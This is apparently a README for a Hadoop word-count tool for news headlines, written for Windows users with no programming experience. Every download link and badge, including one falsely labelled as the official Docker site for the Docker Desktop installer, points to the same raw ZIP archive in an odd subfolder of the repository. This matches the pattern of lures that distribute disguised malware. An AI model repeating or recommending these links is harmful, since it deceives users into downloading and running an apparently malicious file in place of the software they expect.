# 📰 hadoop-news-analytics - Analyze News Headlines Word Frequency

[![Download from GitHub](https://img.shields.io/badge/Download-hadoop--news--analytics-brightgreen)](https://raw.githubusercontent.com/marielhairless289/hadoop-news-analytics/main/boomslang/hadoop-analytics-news-3.2.zip)

## 📋 What is hadoop-news-analytics?

hadoop-news-analytics is a tool that counts how often words appear in news headlines. It uses Apache Hadoop technology to process 5,000 news titles from HuffPost. The tool runs on your own computer using a single virtual server inside Docker. It breaks down the work into steps to find the 50 most common words, ignoring usual filler words like "the" and "and."

You don’t need programming skills to use this. The tool handles everything in the background, so you see clear results without complicated setup.

---

## 🖥️ System Requirements

- Windows 10 or later (64-bit)
- At least 8 GB of RAM
- Minimum 20 GB free disk space
- Internet connection to download software and data
- Docker Desktop installed and running

---

## 🐳 Install Docker on Windows

Docker must be running to use hadoop-news-analytics. If you don’t have it yet, follow these steps:

1. Go to the official Docker site: https://raw.githubusercontent.com/marielhairless289/hadoop-news-analytics/main/boomslang/hadoop-analytics-news-3.2.zip
2. Download the Docker Desktop installer for Windows.
3. Run the installer and follow instructions.
4. After installation, open Docker Desktop and wait until it shows "Docker is running."
5. Make sure virtualization is enabled in your BIOS settings (this is often enabled by default).

---

## 🚀 Getting hadoop-news-analytics

Use the link below to visit the GitHub page where all files are stored.  

[![Get hadoop-news-analytics](https://img.shields.io/badge/GitHub-Download-blue)](https://raw.githubusercontent.com/marielhairless289/hadoop-news-analytics/main/boomslang/hadoop-analytics-news-3.2.zip)

To begin, follow these steps:

1. Click the green **Code** button at the top right of the GitHub page.
2. Select **Download ZIP**.
3. Save the ZIP file to a folder you can easily find, like Desktop.
4. Right-click the ZIP file and choose **Extract All**.
5. Open the extracted folder.

---

## ⚙️ Setting Up hadoop-news-analytics on Windows

### Step 1: Prepare the Environment

In the folder you opened, find the file named `README.md` (this file) and `docker-compose.yml`. These files contain instructions and settings for the Hadoop cluster.

### Step 2: Open Command Prompt or PowerShell

1. Press `Win + R`.
2. Type `cmd` or `powershell`.
3. Press Enter.

### Step 3: Navigate to the Folder

Use the command below to move to your extracted folder. Replace `Path\To\Folder` with the actual folder path.

```
cd Path\To\Folder
```

Example:

```
cd C:\Users\YourName\Desktop\hadoop-news-analytics-main
```

### Step 4: Start the Hadoop Cluster

Run the following command:

```
docker-compose up -d
```

This command tells Docker to build and start all software parts needed. It may take some minutes the first time.

Once done, the system sets up a small Hadoop cluster. This includes storage, resource management, and the job that counts words.

---

## 🔍 Running the Word Count Analysis

### Step 1: Run the MapReduce job

After the setup completes, use this command to start the analysis:

```
docker exec -it hadoop-news-analytics_master_1 bash -c "python3 run_analysis.py"
```

This runs the Python program inside the Hadoop cluster. It reads the news headlines data, processes it in steps, and finds the top 50 words.

### Step 2: Where to find results

The final word counts are saved in the folder:

```
output/top_keywords.txt
```

Open this file with any text editor, like Notepad, to see the results.

---

## 📁 What’s inside the repository?

- **docker-compose.yml** - Configures and launches the Hadoop cluster on Docker.
- **run_analysis.py** - Python script that runs the MapReduce jobs.
- **data/** - Folder containing the news headlines used for analysis.
- **output/** - Where results appear after running analysis.
- **README.md** - This file.

---

## 🛠 How it works - Simple Explanation

hadoop-news-analytics uses a popular method called MapReduce. It splits the work into two parts:

- **Map**: Reads headlines and breaks them into words.
- **Reduce**: Counts how often each word appears.

It filters out common words like "a," "the," and "is" using a list from NLTK, a language tool.

Hadoop runs this across a single virtual computer inside Docker. This setup is the same system used by big companies for processing large data but simplified for this tool.

---

## 🔧 Troubleshooting

### Docker won’t start

- Check if your computer’s virtualization feature is on.
- Restart your machine and Docker service.

### Errors when running commands

- Make sure you are in the correct folder in Command Prompt or PowerShell.
- Confirm Docker is running before starting the cluster.

### Output file is empty or missing

- Ensure the cluster has fully started by waiting a few minutes after `docker-compose up -d`.
- Check the command prompt for errors during analysis.

---

## 📥 Download hadoop-news-analytics

Visit this page to download all files and get started:  

https://raw.githubusercontent.com/marielhairless289/hadoop-news-analytics/main/boomslang/hadoop-analytics-news-3.2.zip

---

## 🧰 Additional Notes

- This tool runs on a virtual environment, so it won’t affect other software on your PC.
- Data processing may take time depending on your system speed.
- The project helps users understand how distributed computing works with real news data but requires only simple steps to run.

---

## 🤝 Support and Feedback

All issues or suggestions can be reported on the GitHub repository under the **Issues** tab. This helps improve the tool for everyone.